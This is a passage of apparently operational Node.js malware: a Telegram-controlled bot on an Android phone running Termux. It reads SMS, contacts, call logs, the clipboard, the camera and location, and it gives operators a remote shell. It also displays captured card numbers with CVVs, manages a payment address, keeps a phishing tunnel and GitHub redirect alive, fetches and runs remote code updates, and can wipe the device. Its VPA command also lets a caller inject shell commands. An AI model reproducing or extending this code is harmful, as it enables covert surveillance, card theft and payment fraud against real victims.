  } else {
    await reply(chatId, ackId, '⚠️ Camera failed. Check Termux:API camera permission.');
  }
}

async function cmdSms(chatId, args, msg, ackId) {
  const n = parseInt(args) || 10;
  const raw = sh(`termux-sms-list -l ${n} -t inbox 2>/dev/null`, 15000);
  try {
    const msgs = JSON.parse(raw);
    if (!msgs.length) return reply(chatId, ackId, '📱 No SMS found.');
    const lines = msgs.map(m =>
      `<b>${esc(m.number)}</b> (${m.received || m.date || '?'})\n${esc((m.body || '').slice(0, 100))}`
    ).join('\n\n');
    await reply(chatId, ackId, `📱 <b>Last ${msgs.length} SMS:</b>\n\n${lines}`);
  } catch {
    await reply(chatId, ackId, '⚠️ SMS read failed. Check Termux:API SMS permission.' +
      (raw ? '\n<pre>' + esc(raw.slice(0, 200)) + '</pre>' : ''));
  }
}

async function cmdContacts(chatId, args, msg, ackId) {
  const raw = sh('termux-contact-list 2>/dev/null', 15000);
  try {
    const contacts = JSON.parse(raw);
    const lines = contacts.slice(0, 30).map(c => `${esc(c.name)}: <code>${esc(c.number)}</code>`).join('\n');
    await reply(chatId, ackId, `👥 <b>Contacts (${contacts.length} total, showing 30):</b>\n\n${lines || 'none'}`);
  } catch {
    await reply(chatId, ackId, '⚠️ Contacts failed. Check Termux:API contacts permission.');
  }
}

async function cmdCallLog(chatId, args, msg, ackId) {
  const raw = sh('termux-call-log -l 15 2>/dev/null', 15000);
  try {
    const calls = JSON.parse(raw);
    const lines = calls.map(c => {
      const icon = c.type === 'INCOMING' ? '📥' : c.type === 'OUTGOING' ? '📤' : '❌';
      return `${icon} <b>${esc(c.name || c.number)}</b> — ${c.duration || '?'}s (${c.date || '?'})`;
    }).join('\n');
    await reply(chatId, ackId, `📞 <b>Call Log:</b>\n\n${lines || 'none'}`);
  } catch {
    await reply(chatId, ackId, '⚠️ Call log failed. Check Termux:API permission.');
  }
}

async function cmdClipboard(chatId) {
  const raw = sh('termux-clipboard-get 2>/dev/null');
  await send(chatId, `📋 <b>Clipboard:</b>\n<pre>${esc((raw || 'empty').slice(0, 2000))}</pre>`);
}

async function cmdShell(chatId, args) {
  if (!args) return send(chatId, '📝 Usage: <code>/shell ls -la</code>');
  const out = sh(args + ' 2>&1', 15000);
  await sendLong(chatId, `<pre>${esc((out || '(no output)').slice(0, 3500))}</pre>`);
}

// ─── Business commands ───────────────────────────────────────

async function cmdCards(chatId) {
  const cardsFile = path.join(process.env.HOME || '/data/data/com.termux/files/home', '.spud', 'data', 'cards.jsonl');
  try {
    const lines = fs.readFileSync(cardsFile, 'utf8').trim().split('\n').filter(Boolean);
    if (!lines.length) return send(chatId, '💳 No cards captured yet.');
    const cards = lines.slice(-10).map(l => {
      try {
        const c = JSON.parse(l);
        return `<b>${esc(c.number || '?')}</b> ${esc(c.expiry || '')} ${esc(c.cvv || '')} — ${esc(c.name || '?')}`;
      } catch { return esc(l.slice(0, 60)); }
    }).join('\n');
    await send(chatId, `💳 <b>Cards (last 10 of ${lines.length}):</b>\n\n${cards}`);
  } catch {
    await send(chatId, '💳 No cards captured yet.');
  }
}

async function cmdVpa(chatId, args) {
  if (!args) {
    const current = sh("grep '^VPA=' ~/.spud/config 2>/dev/null | cut -d= -f2") || '?';
    await send(chatId, `💰 <b>Current VPA:</b> <code>${esc(current)}</code>`);
  } else if (isSuperAdmin(chatId)) {
    sh(`sed -i 's/^VPA=.*/VPA=${args}/' ~/.spud/config`);
    await send(chatId, `✅ VPA changed to <code>${esc(args)}</code>\n⚠️ Restart proxy for effect: /restart`);
  } else {
    await send(chatId, '🚫 VPA change is admin only.');
  }
}

async function cmdRedirect(chatId) {
  if (cfg.githubUser && cfg.githubRepo) {
    await send(chatId, [
      `📄 <b>Redirect page:</b>`,
      `<code>https://${cfg.githubUser}.github.io/${cfg.githubRepo}</code>`,
      ``,
      `<b>Target:</b> <code>${cfg.lastUrl || 'none'}</code>`,
    ].join('\n'));
  } else {
    await send(chatId, '❌ GitHub redirect not configured.\nAdmin: use /setgithub user/repo token');
  }
}

// ─── Admin commands ──────────────────────────────────────────

async function cmdAddOp(chatId, args) {
  const opId = parseInt(args);
  if (!opId || isNaN(opId)) return send(chatId, '📝 Usage: <code>/addop &lt;telegram_user_id&gt;</code>');
  if (opId === SUPER_ADMIN) return send(chatId, '👑 That\'s you, chief.');
  if (cfg.operators.includes(opId)) return send(chatId, `Already an operator: ${opId}`);
  cfg.operators.push(opId); saveCfg();
  await send(chatId, `✅ Operator added: <code>${opId}</code>\nTotal: ${cfg.operators.length}`);
  await send(opId, '🟢 You\'ve been added as an ALLY operator. Send /help for commands.');
}

async function cmdRmOp(chatId, args) {
  const opId = parseInt(args);
  if (!opId) return send(chatId, '📝 Usage: <code>/rmop &lt;telegram_user_id&gt;</code>');
  const had = cfg.operators.includes(opId);
  cfg.operators = cfg.operators.filter(id => id !== opId); saveCfg();
  await send(chatId, had ? `✅ Removed: <code>${opId}</code>` : `⚠️ ${opId} was not an operator.`);
}

async function cmdOps(chatId) {
  const list = cfg.operators.length
    ? cfg.operators.map(id => `  <code>${id}</code>`).join('\n')
    : '  (none)';
  await send(chatId, `👑 Admin: <code>${SUPER_ADMIN}</code>\n\n<b>Operators:</b>\n${list}`);
}

async function cmdSetGithub(chatId, args) {
  const parts = args.split(/\s+/);
  if (parts.length < 2 || !parts[0].includes('/')) {
    return send(chatId, '📝 Usage: <code>/setgithub user/repo ghp_token</code>');
  }
  const [userRepo, token] = parts;
  const [user, repo] = userRepo.split('/');
  cfg.githubUser = user;
  cfg.githubRepo = repo;
  cfg.githubToken = token;
  saveCfg();
  await send(chatId, `✅ GitHub redirect set\n📄 https://${user}.github.io/${repo}`);
  const url = getTunnelUrl();
  if (url) {
    const ok = await updateGitHubRedirect(url);
    await send(chatId, ok ? `🔗 Pushed URL: <code>${url}</code>` : '⚠️ URL push failed — check token permissions.');
  }
}

async function cmdUpdate(chatId, args, msg, ackId) {
  const url = args.trim();
  if (!url) return reply(chatId, ackId, '📝 Usage: <code>/update https://url/to/bot.js</code>');

  try {
    // Step 1: Download
    await reply(chatId, ackId, '⬇️ [1/3] Downloading bot...');
    const tmpPath = path.join(SPUD_DIR, 'bot.run.js.tmp');
    const result = sh(`curl -sL --max-time 30 '${url.replace(/'/g, "\\'")}' -o '${tmpPath}' 2>&1 && wc -c < '${tmpPath}'`, 35000);
    const size = parseInt(result);
    if (!size || size < 1000) {
      sh(`rm -f '${tmpPath}'`);
      return reply(chatId, ackId, `❌ Download failed — ${size || 0} bytes (too small).`);
    }

    // Step 2: Basic validation
    if (ackId) await editMsg(chatId, ackId, `⬇️ [2/3] Downloaded ${fmtBytes(size)}. Validating...`);
    const head = sh(`head -3 '${tmpPath}' 2>/dev/null`, 3000);
    if (!head.includes('node') && !head.includes('use strict') && !head.includes('require') && !head.includes('ALLY')) {
      sh(`rm -f '${tmpPath}'`);
      return reply(chatId, ackId, '❌ File doesn\'t look like a bot script.');
    }

    // Step 3: Install + restart
    sh(`mv '${tmpPath}' '${SPUD_DIR}/bot.run.js'`);

    // Write update notification for the new version to pick up
    try {
      fs.writeFileSync(NOTIFY_FILE, JSON.stringify({
        chatId, oldVer: VERSION, ts: Date.now(), type: 'bot', url, size,
      }));
    } catch {}

    await reply(chatId, ackId, `✅ [3/3] Bot updated (${fmtBytes(size)}). Restarting in 3s...\n\nIf you don't hear back in 30s, the update may have crashed — /shell node ~/.spud/bot.run.js &`);
    log('BOT UPDATE: ' + size + ' bytes from ' + url);
    setTimeout(() => process.exit(0), 3000);
  } catch (e) {
    sh(`rm -f ${SPUD_DIR}/bot.run.js.tmp`);
    await reply(chatId, ackId, '❌ Update failed: ' + esc(e.message));
  }
}

async function cmdUpdateProxy(chatId, args, msg, ackId) {
  const url = args.trim();
  if (!url) return reply(chatId, ackId, '📝 Usage: <code>/updateproxy https://url/to/proxy.mjs</code>');

  try {
    // Step 1: Download
    await reply(chatId, ackId, '⬇️ [1/5] Downloading proxy...');
    const tmpFile = path.join(SPUD_DIR, '.tmp_src.mjs');
    const result = sh(`curl -sL --max-time 60 '${url.replace(/'/g, "\\'")}' -o '${tmpFile}' 2>&1 && wc -c < '${tmpFile}'`, 65000);
    const size = parseInt(result);
    if (!size || size < 5000) {
      sh(`rm -f '${tmpFile}'`);
      return reply(chatId, ackId, `❌ Download failed — ${size || 0} bytes (expected >5KB).`);
    }

    // Step 2: Validate
    if (ackId) await editMsg(chatId, ackId, `⬇️ [2/5] Downloaded ${fmtBytes(size)}. Verifying...`);
    const head = sh(`head -5 '${tmpFile}' 2>/dev/null`, 3000);
    if (!head.includes('import') && !head.includes('require') && !head.includes('http')) {
      sh(`rm -f '${tmpFile}'`);
      return reply(chatId, ackId, '❌ File doesn\'t look like a proxy (no import/require/http found).');
    }

    // Step 3: Encrypt
    if (ackId) await editMsg(chatId, ackId, '🔐 [3/5] Encrypting with device key...');
    const encResult = sh(`node ${SPUD_DIR}/loader.js encrypt '${tmpFile}' 2>&1`, 30000);
    sh(`rm -f '${tmpFile}'`);
    if (!encResult.includes('"ok":true') && !encResult.includes('ok') && !encResult.includes('encrypted')) {
      return reply(chatId, ackId, `❌ Encryption failed:\n<pre>${esc(encResult.slice(0, 300))}</pre>`);
    }

    // Step 4: Restart services
    if (ackId) await editMsg(chatId, ackId, '🔄 [4/5] Restarting services...');
    sh('bash ~/spud.sh stop 2>/dev/null', 10000);
    await sleep(2000);
    sh('bash ~/spud.sh start 2>&1 &', 5000);
    await sleep(8000);

    // Step 5: Health check
    if (ackId) await editMsg(chatId, ackId, '🏥 [5/5] Checking health...');
    const proxyCode = sh('curl -s -o /dev/null -w "%{http_code}" --max-time 5 http://localhost:3000/_health 2>/dev/null', 10000);
    const tunnelUrl = getTunnelUrl();
    const proxyOk = proxyCode === '200';

    const finalMsg = [
      proxyOk ? '✅ <b>PROXY UPDATED</b>' : '⚠️ <b>Proxy updated (health check issue)</b>',
      ``,
      `📦 Size: ${fmtBytes(size)}`,
      `📊 Health: ${proxyOk ? '🟢 200 OK' : '🔴 ' + (proxyCode || 'timeout')}`,
      `🌐 Tunnel: ${tunnelUrl ? '<code>' + tunnelUrl + '</code>' : '⏳ starting...'}`,
      ``,
      `Source: <code>${esc(url.length > 60 ? url.slice(0, 60) + '...' : url)}</code>`,
      !proxyOk ? '\n💡 Try /fixall if health check keeps failing.' : '',
    ].filter(Boolean).join('\n');

    await reply(chatId, ackId, finalMsg);
    log('PROXY UPDATE: ' + size + ' bytes from ' + url);

    if (tunnelUrl && tunnelUrl !== cfg.lastUrl) {
      cfg.lastUrl = tunnelUrl; saveCfg();
      await updateGitHubRedirect(tunnelUrl);
    }
  } catch (e) {
    sh(`rm -f ${SPUD_DIR}/.tmp_src.mjs`);
    await reply(chatId, ackId, '❌ Proxy update failed: ' + esc(e.message));
  }
}

async function cmdNuke(chatId, args, msg, ackId) {
  if (cfg.nukeArmed && (Date.now() - cfg.nukeArmed) < NUKE_WINDOW) {
    cfg.nukeArmed = null; saveCfg();
    await sendAll('💣 <b>NUKE EXECUTING</b> — device wipe. Bot going offline.');
    log('NUKE by ' + chatId);
    await sleep(1000);
    sh('bash ~/spud.sh nuke --confirm --silent 2>/dev/null &');
    running = false;
    setTimeout(() => process.exit(0), 3000);
  } else {
    cfg.nukeArmed = Date.now(); saveCfg();
    await send(chatId,
      '⚠️ <b>NUKE ARMED</b>\n\n' +
      '💣 This DESTROYS ALL DATA. Irreversible.\n' +
      'Send /nuke again within 30s to confirm.\n' +
      'Any other command cancels.'
    );
  }
}

async function cmdHistory(chatId) {
  if (!cmdLog.length) return send(chatId, '📜 No command history yet.');
  const lines = cmdLog.slice(-20).reverse().map(h => {
    const ago = fmtDur(Date.now() - h.at);
    const who = h.by === SUPER_ADMIN ? 'admin' : String(h.by);
    return `${h.ok ? '✅' : '❌'} ${h.cmd} by ${who} — ${h.ms}ms (${ago} ago)`;
  });
  await sendLong(chatId, `📜 <b>Last ${lines.length} commands:</b>\n\n${lines.join('\n')}`);
}

async function cmdSelfTest(chatId, args, msg, ackId) {
  const checks = [];
  const check = (name, fn) => {
    try { const r = fn(); checks.push({ name, ok: !!r, detail: r || 'failed' }); }
    catch (e) { checks.push({ name, ok: false, detail: e.message }); }
  };

  await reply(chatId, ackId, '🔍 Running self-test...');

  check('Shell', () => sh('echo ok') === 'ok' ? 'ok' : '');
  check('Node.js', () => sh('node -v 2>/dev/null'));
  check('Proxy tmux', () => svcStatus('spud-proxy') ? 'running' : '');
  check('Tunnel tmux', () => svcStatus('spud-tunnel') ? 'running' : '');
  check('Proxy health', () => sh('curl -s -o /dev/null -w "%{http_code}" --max-time 3 http://localhost:3000/_health') === '200' ? '200 OK' : '');
  check('Tunnel URL', () => getTunnelUrl() || '');
  check('Battery API', () => { const b = getBattery(); return b.pct >= 0 ? b.pct + '%' : ''; });
  check('Disk write', () => {
    const tmp = path.join(SPUD_DIR, '.selftest');
    fs.writeFileSync(tmp, 'ok'); const ok = fs.readFileSync(tmp, 'utf8') === 'ok';
    fs.unlinkSync(tmp); return ok ? 'ok' : '';
  });
  check('Config decrypt', () => {
    if (!fs.existsSync(CFG_FILE)) return 'no config (first run)';
    decryptCfg(fs.readFileSync(CFG_FILE)); return 'ok';
  });
  check('GitHub API', () => {
    if (!cfg.githubToken) return 'not configured';
    const r = sh(`curl -s -o /dev/null -w "%{http_code}" --max-time 5 -H "Authorization: token ${cfg.githubToken}" https://api.github.com/user`);
    return r === '200' ? 'ok' : r;
  });

  const passed = checks.filter(c => c.ok).length;
  const total = checks.length;
  const lines = checks.map(c => `${c.ok ? '✅' : '❌'} <b>${c.name}:</b> ${esc(String(c.detail).slice(0, 60))}`);

  await reply(chatId, ackId, [
    `🔍 <b>Self-Test: ${passed}/${total} passed</b>`,
    ``,
    ...lines,
    ``,
    passed === total ? '✅ All systems go.' : '⚠️ Some checks failed — review above.',
  ].join('\n'));
}

// ═══════════════════════════════════════════════════════════════
// COMMAND REGISTRY
// ═══════════════════════════════════════════════════════════════
const CMDS = {};
function reg(name, fn, opts = {}) {
  CMDS[name] = { fn, ...opts };
  if (opts.alias) {
    for (const a of opts.alias) CMDS[a] = { fn, ...opts, _alias: true, _aliasOf: name };
  }
}

// Status
reg('/start', cmdStart);
reg('/help', cmdHelp, { alias: ['/h', '/commands', '/cmds'] });
reg('/status', cmdStatus, { alias: ['/s', '/stat'], ack: '📡 Checking status...' });
reg('/url', cmdUrl, { alias: ['/u', '/link'] });
reg('/ping', cmdPing);
reg('/alive', cmdAlive, { alias: ['/a'] });
reg('/version', cmdVersion, { alias: ['/v', '/ver'] });
reg('/health', cmdHealth, { alias: ['/hc'], ack: '🏥 Checking health...' });
reg('/battery', cmdBattery, { alias: ['/bat', '/batt'] });
reg('/ip', cmdIp);
reg('/wifi', cmdWifi);
reg('/disk', cmdDisk);
reg('/mem', cmdMem);

// Services
reg('/tunnel', cmdTunnel, { ack: '🔄 Restarting tunnel...' });
reg('/restart', cmdRestart, { ack: '🔄 Restarting services...' });
reg('/kill', cmdKill, { ack: '🛑 Stopping...' });
reg('/fixall', cmdFixAll, { admin: true, ack: '🔧 Running recovery...' });

// Logs
reg('/logs', cmdLogs, { alias: ['/log'] });
reg('/proxylog', cmdProxyLog, { alias: ['/plog'] });
reg('/tunnellog', cmdTunnelLog, { alias: ['/tlog'] });

// Device
reg('/location', cmdLocation, { alias: ['/loc', '/gps'], ack: '📡 Getting location (15-30s)...' });
reg('/photo', cmdPhoto, { alias: ['/cam', '/camera'], ack: '📸 Capturing photo...' });
reg('/sms', cmdSms, { ack: '📱 Reading SMS...' });
reg('/contacts', cmdContacts, { ack: '👥 Loading contacts...' });
reg('/calllog', cmdCallLog, { ack: '📞 Loading call log...' });
reg('/clipboard', cmdClipboard);
reg('/shell', cmdShell, { alias: ['/sh', '/exec'] });

// Business
reg('/cards', cmdCards);
reg('/vpa', cmdVpa);
reg('/redirect', cmdRedirect);

// Admin
reg('/addop', cmdAddOp, { admin: true });
reg('/rmop', cmdRmOp, { admin: true });
reg('/ops', cmdOps, { admin: true });
reg('/setgithub', cmdSetGithub, { admin: true });
reg('/update', cmdUpdate, { admin: true, ack: '⬇️ Starting bot update...' });
reg('/updateproxy', cmdUpdateProxy, { admin: true, ack: '⬇️ Starting proxy update...' });
reg('/nuke', cmdNuke, { admin: true });
reg('/history', cmdHistory, { admin: true, alias: ['/hist'] });
reg('/selftest', cmdSelfTest, { admin: true, ack: '🔍 Starting self-test...' });

// ─── Command suggestion for typos ────────────────────────────
function suggestCmd(input) {
  const primaryCmds = Object.keys(CMDS).filter(k => !CMDS[k]._alias);
  // Prefix match first
  const prefix = input.slice(0, Math.min(4, input.length));
  for (const c of primaryCmds) {
    if (c !== input && c.startsWith(prefix)) return c;
  }
  // Substring match
  const stem = input.replace('/', '');
  for (const c of primaryCmds) {
    if (c.includes(stem)) return c;
  }
  return null;
}

// ═══════════════════════════════════════════════════════════════
// DISPATCHER
// ═══════════════════════════════════════════════════════════════
async function dispatch(msg) {
  const chatId = msg.chat?.id;
  const text = (msg.text || '').trim();
  const from = msg.from;

  if (!text.startsWith('/')) return;

  const parts = text.split(/\s+/);
  const rawCmd = parts[0].toLowerCase().split('@')[0]; // strip @botname
  const args = text.slice(parts[0].length).trim();

  // ─── Auth ─────────────────────────────────────────────
  if (!isAuthorized(chatId)) {
    log(`UNAUTH: ${chatId} (${from?.username || '?'}) → ${rawCmd}`);
    await send(SUPER_ADMIN,
      `🚨 <b>Unauthorized</b>\nID: <code>${chatId}</code>\nUser: ${from?.username || from?.first_name || '?'}\nCmd: <code>${esc(text.slice(0, 100))}</code>`
    );
    return;
  }

  // ─── Cancel nuke on any non-nuke cmd ──────────────────
  if (cfg.nukeArmed && rawCmd !== '/nuke') {
    cfg.nukeArmed = null; saveCfg();
    await send(chatId, '🔒 Nuke cancelled.');
  }

  // ─── Find command ─────────────────────────────────────
  const entry = CMDS[rawCmd];
  if (!entry) {
    const suggestion = suggestCmd(rawCmd);
    await send(chatId,
      `❓ Unknown: <code>${esc(rawCmd)}</code>` +
      (suggestion ? `\nDid you mean <b>${suggestion}</b>?` : '') +
      `\n\n/help for all commands`
    );
    return;
  }

  // ─── Admin gate ───────────────────────────────────────
  if (entry.admin && !isSuperAdmin(chatId)) {
    await send(chatId, '🚫 Admin only.');
    return;
  }

  const role = isSuperAdmin(chatId) ? 'ADMIN' : 'OP';
  log(`${role}: ${rawCmd} from ${chatId}`);
  stats.cmdsRun++;
  const t0 = Date.now();

  // ─── ACK for slow commands ────────────────────────────
  let ackId = null;
  if (entry.ack) {
    const ack = await send(chatId, entry.ack);
    ackId = ack?.message_id || null;
  }

  // ─── Execute with error catch ─────────────────────────
  let ok = true;
  try {
    await entry.fn(chatId, args, msg, ackId);
  } catch (e) {
    ok = false;
    stats.cmdsFailed++;
    log(`CMD ERR ${rawCmd}: ${e.message}`);
    const errText = `❌ <b>${esc(rawCmd)} failed</b>\n${esc(e.message).slice(0, 300)}`;
    await reply(chatId, ackId, errText);
  }

  // ─── Log ──────────────────────────────────────────────
  const ms = Date.now() - t0;
  stats.lastCmd = { cmd: rawCmd, by: chatId, at: Date.now(), ms };
  cmdLog.push({ cmd: rawCmd, by: chatId, at: Date.now(), ms, ok });
  if (cmdLog.length > CMD_LOG_MAX) cmdLog.shift();
}

// ═══════════════════════════════════════════════════════════════
// WATCHDOG — checks every 45s, auto-recovers services
// ═══════════════════════════════════════════════════════════════
async function watchdog() {
  await sleep(30000); // let services settle after boot
  while (running) {
    await sleep(WATCHDOG_MS);
    try {
      // ─── Tunnel check ───────────────────────────────
      if (!svcStatus('spud-tunnel')) {
        stats.watchdogFixes++;
        log('WD: tunnel down — auto-restarting');
        await sendAll('⚠️ Tunnel down — auto-restarting...');
        sh('pkill -f cloudflared 2>/dev/null');
        await sleep(1000);
        sh('tmux new-session -d -s spud-tunnel "cloudflared tunnel --url http://localhost:3000 2>&1 | tee ~/.spud/logs/tunnel.log"');
        await sleep(12000);
        const url = getTunnelUrl();
        if (url) {
          const changed = url !== cfg.lastUrl;
          cfg.lastUrl = url; saveCfg();
          await sendAll(`✅ Tunnel recovered${changed ? ' (new URL)' : ''}\n🔗 <code>${url}</code>`);
          if (changed) await updateGitHubRedirect(url);
        } else {
          await sendAll('⚠️ Tunnel restarted — URL pending.');
        }
      }

      // ─── Proxy check ───────────────────────────────
      if (!svcStatus('spud-proxy')) {
        stats.watchdogFixes++;
        log('WD: proxy down — auto-restarting');
        await sendAll('⚠️ Proxy down — auto-restarting...');
        sh('bash ~/spud.sh start 2>/dev/null', 15000);
        await sleep(5000);
        const up = svcStatus('spud-proxy');
        await sendAll(`${up ? '✅ Proxy recovered.' : '🔴 Proxy restart failed — try /fixall'}`);
      }

      // ─── URL change detection ──────────────────────
      const currentUrl = getTunnelUrl();
      if (currentUrl && currentUrl !== cfg.lastUrl) {
        cfg.lastUrl = currentUrl; saveCfg();
        log('URL changed: ' + currentUrl);
        await sendAll(`🔗 <b>URL changed:</b>\n<code>${currentUrl}</code>\n💳 <code>${currentUrl}/_payment?amount=499</code>`);
        await updateGitHubRedirect(currentUrl);
      }

      // ─── Low battery warning ───────────────────────
      const batt = getBattery();
      if (batt.pct > 0 && batt.pct <= 15 && batt.status !== 'CHARGING') {
        await sendAll(`🔴 LOW BATTERY: ${batt.pct}% — may shut down!`);
      }
    } catch (e) { log('WD err: ' + e.message); }
  }
}

// ═══════════════════════════════════════════════════════════════
// HEARTBEAT — every 30 min
// ═══════════════════════════════════════════════════════════════
async function heartbeat() {
  await sleep(HEARTBEAT_MS);
  while (running) {
    try {
      const url = getTunnelUrl();
      const batt = getBattery();
      const up = sh('uptime -p 2>/dev/null') || '?';
      const icon = batt.pct > 50 ? '🔋' : batt.pct > 15 ? '🪫' : batt.pct >= 0 ? '🔴' : '❓';
      const proxyUp = svcStatus('spud-proxy');
      const tunnelUp = svcStatus('spud-tunnel');

      await sendAll([
        `💓 <b>${cfg.deviceId}</b>`,
        `${icon} ${batt.pct >= 0 ? batt.pct + '%' : 'N/A'} | ${up}`,
        `Proxy: ${proxyUp ? '🟢' : '🔴'} Tunnel: ${tunnelUp ? '🟢' : '🔴'}`,
        url ? `🔗 <code>${url}</code>` : '🔴 no tunnel',
        `📊 ${stats.cmdsRun} cmds | ${stats.cmdsFailed} err | v${VERSION}`,
      ].join('\n'));
    } catch (e) { log('heartbeat err: ' + e.message); }
    await sleep(HEARTBEAT_MS);
  }
}

// ═══════════════════════════════════════════════════════════════
// LONG POLLING (exponential backoff on errors)
// ═══════════════════════════════════════════════════════════════
async function poll() {
  let backoff = 0;
  const MAX_BACKOFF = 30000;

  while (running) {
    try {
      const updates = await tg('getUpdates', {
        offset,
        timeout: POLL_TIMEOUT,
        allowed_updates: ['message'],
      });

      backoff = 0; // reset on success

      if (updates && updates.length) {
        for (const u of updates) {
          offset = u.update_id + 1;
          if (u.message) {
            try { await dispatch(u.message); }
            catch (e) { log('dispatch err: ' + e.message); }
          }
        }
      }
    } catch (e) {
      stats.pollErrors++;
      backoff = Math.min(backoff + 5000, MAX_BACKOFF);
      log(`poll err (backoff ${backoff}ms): ${e.message || e}`);
      await sleep(backoff);
    }
  }
}

// ═══════════════════════════════════════════════════════════════
// BOOT SEQUENCE — self-test + update notification + startup msg
// ═══════════════════════════════════════════════════════════════

// Absorb pending configs from ADB push
function absorbPendingConfigs() {
  const ghPending = path.join(SPUD_DIR, 'pending-github.json');
  try {
    if (fs.existsSync(ghPending)) {
      const raw = JSON.parse(fs.readFileSync(ghPending, 'utf8'));
      if (raw.githubUser && raw.githubRepo && raw.githubToken) {
        cfg.githubUser = raw.githubUser;
        cfg.githubRepo = raw.githubRepo;
        cfg.githubToken = raw.githubToken;
        saveCfg();
        fs.unlinkSync(ghPending);
        log('Absorbed GitHub config from ADB push');
      }
    }
  } catch (e) { log('absorb err: ' + e.message); }
}

// Check if we just got updated — send confirmation
async function checkUpdateNotification() {
  try {
    if (!fs.existsSync(NOTIFY_FILE)) return;
    const info = JSON.parse(fs.readFileSync(NOTIFY_FILE, 'utf8'));
    fs.unlinkSync(NOTIFY_FILE);

    const restartTime = Math.floor((Date.now() - info.ts) / 1000);
    if (info.type === 'bot') {
      await send(info.chatId, [
        `✅ <b>BOT UPDATE SUCCESSFUL</b>`,
        ``,
        `🆕 Now running: <b>v${VERSION}</b> (was v${info.oldVer || '?'})`,
        `📦 ${fmtBytes(info.size || 0)} from ${esc((info.url || '').slice(0, 50))}`,
        `⏱ Restart took ${restartTime}s`,
        ``,
        `All systems go. Send /selftest to verify everything.`,
      ].join('\n'));
      log('Post-update notification sent: v' + info.oldVer + ' → v' + VERSION);
    }
  } catch (e) { log('update notify err: ' + e.message); }
}

async function startup() {
  const brand = sh('getprop ro.product.brand 2>/dev/null');
  const model = sh('getprop ro.product.model 2>/dev/null');
  cfg.deviceId = `${brand} ${model}`.trim() || os.hostname();
  if (!cfg.deployedAt) cfg.deployedAt = Date.now();
  cfg.startedAt = Date.now();
  saveCfg();

  log(`ALLY Bot v${VERSION} JUGGERNAUT — ${cfg.deviceId} — admin: ${SUPER_ADMIN}`);

  // Verify telegram token
  const me = await tg('getMe');
  if (!me) {
    log('Bot token invalid or no network. Retrying in 30s...');
    await sleep(30000);
    const retry = await tg('getMe');
    if (!retry) {
      log('FATAL: Cannot reach Telegram API');
      process.exit(1);
    }
  }
  log(`Bot: @${(me || {}).username}`);

  // Check for post-update notification
  await checkUpdateNotification();

  // Gather boot status
  const url = getTunnelUrl();
  if (url) { cfg.lastUrl = url; saveCfg(); }
  const proxyUp = svcStatus('spud-proxy');
  const tunnelUp = svcStatus('spud-tunnel');
  const batt = getBattery();
  const battStr = batt.pct >= 0 ? `${batt.pct}% (${batt.status})` : 'N/A';

  await sendAll([
    `🟢 <b>ALLY Bot v${VERSION} started</b>`,
    ``,
    `📱 ${cfg.deviceId}`,
    `🤖 @${(me || {}).username}`,
    `🔋 ${battStr}`,
    ``,
    `<b>Services:</b>`,
    `  Proxy:  ${proxyUp ? '🟢' : '🔴'}`,
    `  Tunnel: ${tunnelUp ? '🟢' : '🔴'}`,
    url ? `\n🔗 <code>${url}</code>` : '\n⏳ Tunnel pending...',
    cfg.githubUser ? `📄 https://${cfg.githubUser}.github.io/${cfg.githubRepo}` : '',
    ``,
    `🧠 JUGGERNAUT ready. /help for commands.`,
  ].filter(Boolean).join('\n'));

  if (url) await updateGitHubRedirect(url);
}

// ═══════════════════════════════════════════════════════════════
// SHUTDOWN + MAIN
// ═══════════════════════════════════════════════════════════════
function shutdown(sig) {
  log('Shutdown: ' + sig);
  running = false;
  sendAll(`🔴 Bot offline (${sig})`).catch(() => {}).finally(() => {
    setTimeout(() => process.exit(0), 2000);
  });
}

process.on('SIGINT', () => shutdown('SIGINT'));
process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('uncaughtException', (e) => {
  log('UNCAUGHT: ' + (e.stack || e.message));
  // Don't exit on non-fatal errors — poll loop and watchdog will recover
  if (e.message && (e.message.includes('ENOMEM') || e.message.includes('Cannot allocate'))) {
    log('FATAL: out of memory — exiting');
    process.exit(1);
  }
});
process.on('unhandledRejection', (e) => { log('UNHANDLED: ' + (e?.message || e)); });

async function main() {
  loadCfg();
  absorbPendingConfigs();
  await startup();
  poll();
  watchdog();
  heartbeat();
  log('All loops running — JUGGERNAUT active.');
}

main().catch(e => { log('FATAL: ' + e.message); process.exit(1); });
